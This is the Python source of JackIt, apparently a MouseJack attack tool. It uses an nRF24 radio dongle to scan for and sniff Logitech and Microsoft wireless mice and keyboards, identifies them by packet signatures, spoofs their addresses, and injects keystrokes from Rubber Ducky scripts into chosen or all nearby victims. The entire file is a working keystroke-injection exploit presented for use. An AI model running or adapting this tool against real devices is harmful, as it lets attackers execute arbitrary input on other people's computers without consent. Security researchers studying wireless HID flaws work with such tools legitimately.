#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function
import datetime
import os
import time
import click
import tabulate
from lib import nrf24, nrf24_reset
import keymap
import duckyparser
from plugins import logitech, microsoft, microsoft_enc


__version__ = 0.02
__authors__ = "phikshun, infamy"

# some console colours
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


def _print_err(text):
    print(R + '[!] ' + W + text)


class JackIt(object):
    ''' Class for scanning, pinging and fingerprint devices '''

    def __init__(self, disable_lna=False, debug=False, reset=False):
        self.channels = range(2, 84)
        self.channel_index = 0
        self.debug = debug
        self.devices = {}
        self.init_radio(disable_lna, reset)

    def _debug(self, text):
        if self.debug:
            print(P + "[D] " + W + text)

    def hexify(self, data):
        return ':'.join('{:02X}'.format(x) for x in data)

    def unhexify_addr(self, val):
        return self.unhexify(val)[::-1][:5]

    def unhexify(self, val):
        return val.replace(':', '').decode('hex')

    def serialize_payload(self, p):
        return str(bytearray(p))

    def serialize_address(self, a):
        return ''.join(chr(b) for b in a[::-1])

    def init_radio(self, disable_lna, reset):
        if reset:
            self._debug("Reseting PARadio USB Dongle")
            nrf24_reset.reset_radio(0)
        self.radio = nrf24.nrf24(0)
        if not disable_lna:
            self._debug("Enabled LNA")
            self.radio.enable_lna()

    def add_device(self, address, payload):
        channel = self.channels[self.channel_index]
        if address in self.devices:
            self.devices[address]['count'] += 1
            self.devices[address]['timestamp'] = time.time()
            if channel not in self.devices[address]['channels']:
                self.devices[address]['channels'].append(channel)
            if self.fingerprint_device(payload):
                self.devices[address]['device']  = self.fingerprint_device(payload)
                self.devices[address]['payload'] = payload
        else:
            self.devices[address] = {}
            self.devices[address]['device']    = ''
            self.devices[address]['payload']   = payload
            self.devices[address]['count']     = 1
            self.devices[address]['channels']  = [self.channels[self.channel_index]]
            self.devices[address]['address']   = [int(b, 16) for b in address.split(':')]
            self.devices[address]['timestamp'] = time.time()
            self.devices[address]['device']    = self.fingerprint_device(payload)

    def scan(self, timeout=5.0):
        self.radio.enter_promiscuous_mode('')
        self.radio.set_channel(self.channels[self.channel_index])
        dwell_time = 0.1
        last_tune = time.time()
        start_time = time.time()

        try:
            while time.time() - start_time < timeout:
                if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
                    self.channel_index = (self.channel_index + 1) % (len(self.channels))
                    self.radio.set_channel(self.channels[self.channel_index])
                    last_tune = time.time()

                value = self.radio.receive_payload()
                if len(value) >= 5:
                    address, payload = value[0:5], value[5:]
                    a = self.hexify(address)
                    self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], a, self.hexify(payload)))
                    self.add_device(a, payload)

        except RuntimeError:
            print(R + '[!] ' + W + 'Runtime error during scan')
            exit(-1)
        return self.devices

    def sniff(self, timeout, address):
        addr_string = address[:]
        address = [int(b, 16) for b in address.split(':')]
        self.radio.enter_sniffer_mode(self.serialize_address(address))
        self.radio.set_channel(self.channels[self.channel_index])
        dwell_time = 0.1
        ping = '0F:0F:0F:0F'.replace(':', '').decode('hex')
        last_ping = time.time()
        start_time = time.time()

        try:
            while time.time() - start_time < timeout:
                if len(self.channels) > 1 and time.time() - last_ping > dwell_time:
                    if not self.radio.transmit_payload(self.serialize_payload(ping), 1, 1):
                        success = False
                        for self.channel_index in range(len(self.channels)):
                            self.radio.set_channel(self.channels[self.channel_index])
                            if self.radio.transmit_payload(self.serialize_payload(ping), 1, 1):
                                last_ping = time.time()
                                success = True
                                self._debug("Ping success on channel %d" % self.channels[self.channel_index])
                                break

                        if not success:
                            self._debug("Ping failed")
                    else:
                        last_ping = time.time()

                value = self.radio.receive_payload()
                if value[0] == 0:
                    last_ping = time.time()
                    payload = value[1:]
                    self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], addr_string, self.hexify(payload)))
                    self.add_device(addr_string, payload)

        except RuntimeError:
            _print_err('Runtime error while sniffing')
            exit(-1)
        return self.devices

    def sniffer_mode(self, address):
        self.radio.enter_sniffer_mode(self.serialize_address(address))

    def find_channel(self, address):
        ping = '0F:0F:0F:0F'.replace(':', '').decode('hex')
        self.radio.enter_sniffer_mode(self.serialize_address(address))
        for channel in range(2, 84):
            self.radio.set_channel(channel)
            if self.radio.transmit_payload(self.serialize_payload(ping)):
                return channel
        return None

    def set_channel(self, channel):
        self.current_channel = channel
        self.radio.set_channel(channel)

    def transmit_hook(self, payload):
        self._debug("Sending: " + self.hexify(payload))

    def transmit_payload(self, payload):
        self.transmit_hook(payload)
        return self.radio.transmit_payload(self.serialize_payload(payload))

    def fingerprint_device(self, p):
        if not p:
            return ''
        if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
            # Most likely a non-XOR encrypted Microsoft mouse
            return 'Microsoft HID'
        elif len(p) == 19 and p[0] == 0x0a:
            # Most likely an XOR encrypted Microsoft mouse
            return 'MS Encrypted HID'
        elif len(p) == 10 and p[0] == 0 and p[1] == 0xC2:
            # Definitely a logitech mouse movement packet
            return 'Logitech HID'
        elif len(p) == 22 and p[0] == 0 and p[1] == 0xD3:
            # Definitely a logitech keystroke packet
            return 'Logitech HID'
        elif len(p) == 5 and p[0] == 0 and p[1] == 0x40:
            # Most likely logitech keepalive packet
            return 'Logitech HID'
        elif len(p) == 10 and p[0] == 0 and p[1] == 0x4F:
            # Most likely logitech sleep timer packet
            return 'Logitech HID'
        else:
            return ''

    def attack(self, hid, attack):
        hid.build_frames(attack)
        for key in attack:
            if key['frames']:
                for frame in key['frames']:
                    self.transmit_payload(frame[0])
                    # This code was for additional reliability -- may cause duplicate keystrokes
                    # (currently leaving it disabled)
                    #
                    # if not self.transmit_payload(frame[0]):
                    #    for i in range(0,5):
                    #        time.sleep(0.1)
                    #        if self.transmit_payload(frame[0]):
                    #            break
                    time.sleep(frame[1] / 1000.0)


def banner():
    print(r"""
     ____.              __   .___  __
    |    |____    ____ |  | _|   |/  |_
    |    \__  \ _/ ___\|  |/ /   \   __\
/\__|    |/ __ \\  \___|    <|   ||  |
\________(____  /\___  >__|_ \___||__|
              \/     \/     \/          """)

    print("JackIt Version %0.2f" % __version__)
    print("Created by %s" % __authors__)
    print("")


def confirmroot():
    # make sure we are root
    if os.getuid() != 0:
        _print_err("ERROR: You need to run as root!")
        _print_err("login as root (su root) or try sudo ./jackit.py")
        exit(-1)


@click.command()
@click.option('--debug', is_flag=True, help='Enable debug')
@click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
@click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
@click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
@click.option('--layout', default='us', help="Keyboard layout: %s" % ", ".join(keymap.mapping.keys()))
@click.option('--address', default="", help="Address of device to target attack")
@click.option('--vendor', default="", help="Vendor of device to target (required when specifying address)")
@click.option('--reset', is_flag=True, help="Reset CrazyPA dongle prior to initalization")
def cli(debug, script, lowpower, interval, layout, address, vendor, reset):

    banner()
    confirmroot()

    if debug:
        print(O + "[W] " + W + "Debug is enabled.")

    if layout not in keymap.mapping.keys():
        _print_err("Invalid keyboard layout selected.")
        exit(-1)

    targeted = False
    if address and not vendor:
        _print_err("Please use --vendor option to specify either Logitech or Microsoft.")
        exit(-1)
    elif vendor and not address:
        _print_err("Please use --address option when specifying a vendor.")
        exit(-1)
    elif vendor and address:
        vendor = vendor.lower()
        if not vendor.startswith("l") and not vendor.startswith("m"):
            _print_err("Unknown vendor: specify either Microsoft of Logitech.")
            exit(-1)
        else:
            targeted = True

    if script == "":
        _print_err("You must supply a ducky script using --script <filename>")
        _print_err("Attacks are disabled.")
        attack = ""
    else:
        f = open(script, 'r')
        parser = duckyparser.DuckyParser(f.read(), keymap.mapping[layout])
        attack = parser.parse()

    # Initialize the radio
    try:
        jack = JackIt(lowpower, debug, reset)
    except Exception as e:
        if e.__str__() == "Cannot find USB dongle.":
            _print_err("Cannot find Crazy PA USB dongle.")
            _print_err("Please make sure you have it preloaded with the mousejack firmware.")
            exit(-1)
        else:
            raise e

    try:
        if targeted:
            print(G + "[+] " + W + 'Starting sniff for %s...' % address)
            if vendor.startswith("l"):
                jack.add_device(address, [0, 0xC2, 0, 0, 0, 0, 0, 0, 0, 0])
            if vendor.startswith("m"):
                jack.add_device(address, [])
        else:
            print(G + "[+] " + W + 'Starting scan...')

        try:
            # Enter main loop
            while True:
                if targeted:
                    devices = jack.sniff(interval, address)
                else:
                    devices = jack.scan(interval)

                click.clear()
                if targeted:
                    print(GR + "[+] " + W + ("Sniffing for %s every %ds " % (address, interval)) + G + "CTRL-C " + W + "when ready.")
                else:
                    print(GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready.")
                print("")

                idx = 0
                pretty_devices = []
                for key, device in devices.iteritems():
                    idx = idx + 1
                    pretty_devices.append([
                        idx,
                        key,
                        ",".join(str(x) for x in device['channels']),
                        device['count'],
                        str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
                        device['device'],
                        jack.hexify(device['payload'])
                    ])

                print(tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"]))
        except KeyboardInterrupt:
            print("")

        if 'devices' not in locals() or len(devices) == 0:
            _print_err("No devices found please try again...")
            exit(-1)

        if attack == "":
            _print_err("No attack script was provided...")
            exit(-1)

        print(GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + " separated by commas, or '%s': " % (G + 'all' + W), end="")
        value = click.prompt('', default="all")
        value = value.strip().lower()

        if value == "all":
            victims = pretty_devices[:]
        else:
            victims = []
            for vic in value.split(","):
                if int(vic) <= len(pretty_devices):
                    victims.append(pretty_devices[(int(vic) - 1)])
                else:
                    _print_err(("Device %d key is out of range" % int(vic)))

        targets = []
        for victim in victims:
            if victim[1] in devices:
                targets.append(devices[victim[1]])

        for target in targets:
            payload = target['payload']
            channels = target['channels']
            address = target['address']
            device_type = target['device']

            # Sniffer mode allows us to spoof the address
            jack.sniffer_mode(address)
            hid = None
            # Figure out what we've got
            device_type = jack.fingerprint_device(payload)
            if device_type == 'Microsoft HID':
                hid = microsoft.HID(address, payload)
            elif device_type == 'MS Encrypted HID':
                hid = microsoft_enc.HID(address, payload)
            elif device_type == 'Logitech HID':
                hid = logitech.HID(address, payload)

            if hid:
                # Attempt to ping the devices to find the current channel
                lock_channel = jack.find_channel(address)

                if lock_channel:
                    print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, lock_channel))
                    jack.attack(hid, attack)
                else:
                    # If our pings fail, go full hail mary
                    print(R + '[-] ' + W + 'Ping failed, trying all channels')
                    for channel in channels:
                        jack.set_channel(channel)
                        print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, channel))
                        jack.attack(hid, attack)
            else:
                print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address)))
                continue

        print(GR + '\n[+] ' + W + "All attacks completed\n")

    except KeyboardInterrupt:
        print('\n ' + R + '(^C)' + O + ' interrupted\n')
        print("[-] Quitting")


if __name__ == '__main__':
    cli()
